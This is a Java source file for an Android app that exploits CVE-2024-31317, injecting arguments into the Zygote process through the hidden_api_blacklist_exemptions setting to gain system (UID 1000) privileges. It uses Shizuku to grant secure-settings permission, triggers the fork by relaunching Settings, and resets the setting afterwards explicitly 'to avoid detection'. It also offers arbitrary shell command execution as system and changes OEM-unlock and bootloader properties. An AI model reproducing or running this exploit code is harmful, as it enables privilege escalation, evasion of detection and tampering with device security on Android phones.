package com.takattowo.bootloaderspoofer;

import android.content.ContentValues;
import android.content.Context;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Detects and exploits CVE-2024-31317 to gain system-level privileges.
 *
 * <p>Adapted from procdev (vortexdigitalera/procdev) — BootLoader.java and
 * ZygoteFragment.java. This vulnerability (CVE-2024-31317) allows injecting
 * arguments into the Zygote process via the {@code hidden_api_blacklist_exemptions}
 * Settings.Global key, enabling code execution with arbitrary UIDs.
 *
 * <p>The exploit flow:
 * <ol>
 *   <li>Grant WRITE_SECURE_SETTINGS via Shizuku</li>
 *   <li>Force-stop the Settings app</li>
 *   <li>Write the Zygote payload to Settings.Global[hidden_api_blacklist_exemptions]</li>
 *   <li>Launch the Settings app — Zygote forks with our injected arguments</li>
 *   <li>Reset the settings key after a short delay to avoid detection</li>
 * </ol>
 *
 * <p>With system (UID 1000) privileges, we can manipulate {@code ro.oem.*}
 * and bootloader properties that control unlock capability.
 */
final class PrivilegeEscalator {

    private static final String TAG = "PrivilegeEscalator";

    /** Settings.Global key for hidden API blacklist exemptions (CVE-2024-31317 vector). */
    private static final String SETTINGS_KEY = "hidden_api_blacklist_exemptions";
    private static final String SETTINGS_URI = "content://settings/global";

    /** Reset delay after payload injection (ms). */
    private static final int RESET_DELAY_MS = 200;

    private static final ExecutorService executor = Executors.newSingleThreadExecutor();
    private static final AtomicBoolean exploiting = new AtomicBoolean(false);

    /** Callback for exploit result. */
    interface ExploitCallback {
        void onResult(boolean success, String message);
    }

    /** Callback for CVE check result. */
    interface CveCheckCallback {
        void onResult(boolean vulnerable, String details);
    }

    private PrivilegeEscalator() {}

    /**
     * Check if the device is vulnerable to CVE-2024-31317.
     *
     * <p>The vulnerability exists when framework.jar does NOT contain the string
     * "Embedded nulls not allowed" — this string was added as a fix to reject
     * payloads containing null bytes. If the string is absent, the device is
     * vulnerable.
     *
     * @param context  Application context
     * @param callback Callback receiving vulnerability status
     */
    static void checkVulnerability(Context context, CveCheckCallback callback) {
        executor.execute(() -> {
            boolean vulnerable = checkCve2024_31317();
            String details = vulnerable
                    ? "Device is vulnerable to CVE-2024-31317 (Zygote injection)"
                    : "Device is patched against CVE-2024-31317";
            callback.onResult(vulnerable, details);
        });
    }

    /**
     * Synchronous CVE-2024-31317 check.
     * Checks if framework.jar contains the "Embedded nulls not allowed" fix string.
     *
     * @return true if vulnerable (fix string NOT found), false if patched
     */
    static boolean checkCve2024_31317() {
        BufferedReader reader = null;
        try {
            Process process = new ProcessBuilder()
                    .command("sh", "-c",
                            "strings /system/framework/framework.jar | grep -m1 'Embedded nulls not allowed'")
                    .redirectErrorStream(true)
                    .start();

            reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            boolean found = reader.readLine() != null;
            process.waitFor();

            // If the fix string is NOT found, the device is vulnerable
            return !found;
        } catch (Exception e) {
            Log.w(TAG, "CVE check failed", e);
            return false;
        } finally {
            if (reader != null) {
                try { reader.close(); } catch (Exception ignored) {}
            }
        }
    }

    /**
     * Check if the current Android version is in the vulnerable range.
     * CVE-2024-31317 affects Android 12 through 14 (API 31-34).
     *
     * @return true if the Android version is potentially vulnerable
     */
    static boolean isVulnerableAndroidVersion() {
        int sdk = Build.VERSION.SDK_INT;
        return sdk >= Build.VERSION_CODES.S && sdk <= Build.VERSION_CODES.UPSIDE_DOWN_CAKE;
    }

    /**
     * Execute a Zygote injection payload to gain system-level privileges.
     *
     * <p>This writes the payload to Settings.Global[hidden_api_blacklist_exemptions]
     * and launches the Settings app to trigger the Zygote fork. The payload
     * executes a shell command with the specified UID/GID.
     *
     * <p>Requires Shizuku to be running with permission granted.
     *
     * @param context  Application context
     * @param payload  Zygote payload (from {@link ZygotePayloadBuilder})
     * @param callback Callback receiving execution result
     */
    static void executePayload(Context context, String payload, ExploitCallback callback) {
        if (exploiting.get()) {
            callback.onResult(false, "Exploit already in progress");
            return;
        }

        if (payload == null || payload.trim().isEmpty()) {
            callback.onResult(false, "Payload is empty");
            return;
        }

        // Verify Shizuku is ready
        if (!ShizukuManager.isRunning()) {
            callback.onResult(false, "Shizuku is not running");
            return;
        }
        if (!ShizukuManager.checkPermission()) {
            callback.onResult(false, "Shizuku permission not granted");
            return;
        }

        exploiting.set(true);
        executor.execute(() -> {
            try {
                // Step 1: Grant WRITE_SECURE_SETTINGS so we can write to Settings.Global
                String grantResult = ShizukuManager.executeShell(
                        "pm grant " + context.getPackageName() + " android.permission.WRITE_SECURE_SETTINGS");
                Log.i(TAG, "Grant WRITE_SECURE_SETTINGS: " + grantResult);

                // Step 2: Force-stop Settings app to ensure clean state
                ShizukuManager.executeShell("am force-stop com.android.settings");

                // Step 3: Write payload to Settings.Global
                boolean written = writeToSettings(context, payload);
                if (!written) {
                    exploiting.set(false);
                    callback.onResult(false, "Failed to write payload to Settings.Global");
                    return;
                }

                // Step 4: Launch Settings app to trigger Zygote fork with injected args
                ShizukuManager.executeShell("am start -n com.android.settings/.Settings");

                // Step 5: Reset the settings key after a short delay
                try {
                    Thread.sleep(RESET_DELAY_MS);
                } catch (InterruptedException ignored) {
                    Thread.currentThread().interrupt();
                }
                resetSettings(context);

                exploiting.set(false);
                callback.onResult(true, "Payload injected successfully — system privileges granted");
            } catch (Exception e) {
                Log.e(TAG, "Payload execution failed", e);
                exploiting.set(false);
                callback.onResult(false, "Execution failed: " + e.getMessage());
            }
        });
    }

    /**
     * Enable OEM unlocking using system-level privileges via CVE-2024-31317.
     * This sets all relevant properties and settings that control unlock capability.
     *
     * @param context  Application context
     * @param callback Callback receiving result
     */
    static void enableOemUnlock(Context context, ExploitCallback callback) {
        String payload = ZygotePayloadBuilder.buildOemUnlockPayload();
        if (payload == null) {
            callback.onResult(false, "Failed to build OEM unlock payload");
            return;
        }
        executePayload(context, payload, callback);
    }

    /**
     * Disable OEM unlocking (re-lock simulation) via CVE-2024-31317.
     *
     * @param context  Application context
     * @param callback Callback receiving result
     */
    static void disableOemUnlock(Context context, ExploitCallback callback) {
        String payload = ZygotePayloadBuilder.buildOemLockPayload();
        if (payload == null) {
            callback.onResult(false, "Failed to build OEM lock payload");
            return;
        }
        executePayload(context, payload, callback);
    }

    /**
     * Write a system property using system-level privileges via CVE-2024-31317.
     *
     * @param context   Application context
     * @param propName  Property name (e.g. "ro.oem_unlock_supported")
     * @param propValue Property value (e.g. "1")
     * @param callback  Callback receiving result
     */
    static void setSystemProperty(Context context, String propName, String propValue,
                                  ExploitCallback callback) {
        String payload = ZygotePayloadBuilder.buildPropertyWritePayload(propName, propValue);
        if (payload == null) {
            callback.onResult(false, "Failed to build property write payload");
            return;
        }
        executePayload(context, payload, callback);
    }

    /**
     * Execute an arbitrary shell command with system (UID 1000) privileges.
     *
     * @param context  Application context
     * @param command  Shell command to execute
     * @param callback Callback receiving result
     */
    static void executeAsSystem(Context context, String command, ExploitCallback callback) {
        String payload = ZygotePayloadBuilder.buildSystemPayload(command);
        if (payload == null) {
            callback.onResult(false, "Failed to build system payload");
            return;
        }
        executePayload(context, payload, callback);
    }

    /**
     * Write the payload to Settings.Global[hidden_api_blacklist_exemptions].
     * This must be called from a background thread.
     */
    private static boolean writeToSettings(Context context, String payload) {
        try {
            ContentValues values = new ContentValues();
            values.put(Settings.Global.NAME, SETTINGS_KEY);
            values.put(Settings.Global.VALUE, payload);
            context.getContentResolver().insert(Uri.parse(SETTINGS_URI), values);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Failed to write to Settings.Global", e);
            return false;
        }
    }

    /**
     * Reset the hidden_api_blacklist_exemptions setting to "null" to clean up
     * after the exploit and avoid detection.
     */
    private static void resetSettings(Context context) {
        try {
            ContentValues values = new ContentValues();
            values.put(Settings.Global.NAME, SETTINGS_KEY);
            values.put(Settings.Global.VALUE, "null");
            context.getContentResolver().insert(Uri.parse(SETTINGS_URI), values);
        } catch (Exception e) {
            Log.w(TAG, "Failed to reset settings", e);
        }
    }

    /**
     * Read current OEM unlock related properties.
     *
     * @return Formatted string with all relevant property values
     */
    static String readOemUnlockStatus() {
        StringBuilder sb = new StringBuilder();
        sb.append("=== OEM Unlock Status ===\n");

        // Settings.Global
        String oemEnabled = ShizukuManager.getSetting("global", "oem_unlock_enabled");
        sb.append("oem_unlock_enabled: ").append(oemEnabled != null ? oemEnabled : "unknown").append("\n");

        // Properties (read-only, but show current values)
        String[] props = {
                "ro.oem_unlock_supported",
                "ro.boot.flash.locked",
                "ro.boot.verifiedbootstate",
                "ro.boot.warranty_bit",
                "persist.sys.oem_unlock_allowed",
                "sys.oem_unlock_allowed",
                "ro.oem.key1",
                "ro.boot.oem_locked",
                "ro.frp.pst",
        };

        for (String prop : props) {
            String value = ShizukuManager.executeShell("getprop " + prop);
            if (value != null && !value.isEmpty()) {
                sb.append(prop).append(": ").append(value.trim()).append("\n");
            }
        }

        return sb.toString();
    }

    /**
     * Check if the exploit is currently running.
     */
    static boolean isExploiting() {
        return exploiting.get();
    }
}
